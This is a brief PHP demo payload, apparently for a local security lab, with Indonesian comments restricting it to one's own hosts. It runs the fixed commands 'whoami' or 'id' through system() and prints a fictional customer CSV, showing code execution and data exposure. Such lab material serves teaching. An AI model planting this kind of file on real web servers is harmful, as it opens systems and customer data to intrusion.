<?php
// Payload demo untuk lab lokal: hanya menjalankan perintah identitas proses yang tetap.
// Jangan dipakai pada aplikasi/host yang bukan milik sendiri.
header('Content-Type: text/plain; charset=utf-8');
$projectRoot = dirname(__DIR__, 2);
require_once $projectRoot . '/src/bootstrap.php';
echo "[Demo] Identitas proses PHP:\n";
if (PHP_OS_FAMILY === 'Windows') {
    system('whoami');
} else {
    system('id');
}
echo "\n[Demo] Dataset pelanggan fiktif:\n";
readfile(customer_csv_path());
